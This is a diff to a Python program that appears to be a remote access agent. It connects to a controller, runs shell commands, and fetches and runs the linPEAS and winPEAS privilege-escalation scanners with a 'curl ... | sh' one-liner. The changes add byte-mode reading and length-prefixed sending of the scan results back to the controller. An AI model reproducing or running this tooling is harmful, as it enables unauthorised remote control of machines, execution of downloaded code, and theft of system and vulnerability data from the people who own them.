@@ -15,7 +15,9 @@ host = "127.0.0.1"
 port = 5656
 dataTemp = None
 connected = False
+# stop = FLAG TO PAUSE THE THREAD
 stop = False
+
 #Timer to check the connection (seconds)
 checkerTimeout = 1.5
 log = ""
@@ -74,9 +76,12 @@ def saveFile(text,name):
         logEvents(e)
         
         
-def readFile(path):
+def readFile(path,asBytes):
     try:
-        with open(path,"r") as f:
+        operation = "r"
+        if asBytes:
+            operation += "b"
+        with open(path,operation) as f:
             return f.read()
     except Exception as e:
         logEvents(e)
@@ -93,12 +98,14 @@ def winPEAS(force):
         execute("del /Q rec.txt")
         execute(f"powershell -c \"{urlLatestVersion}\"")
         saveFile(execute(f"powershell -c \"{oneLiner}\""),"rec.txt")
-        send(readFile("rec.txt"))
+        send(readFile("rec.txt",True))
     else:
-        send(readFile("rec.txt"))
+        send(readFile("rec.txt",True))
         
-        
+
+# VULNERABILITY SCAN FOR LINUX    
 def linPEAS(force):
+
     global stop
     oneLiner = "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
     existsFile = os.path.exists("rec.txt")
@@ -107,12 +114,20 @@ def linPEAS(force):
             execute("rm -f rec.txt")
         stop = True
         saveFile(execute(oneLiner),"rec.txt")
-        send(readFile("rec.txt"))
+
+        # WE READ THE FILE IN BYTE MODEs
+        data = readFile("rec.txt", True)
+        # FIRST WE SEND THE LENGTH OF THE BYTES IN THE SCAN FILE
+        sendLen(data)
+        # THEN WE SEND THE BYTES
+        sendBytes(data)
         stop = False
     else:
         stop = True
-        send(readFile("rec.txt"))
+        send(readFile("rec.txt", True))
         stop = False
+
+
 def sysInfo():
     return f"""
     -------------------------------------
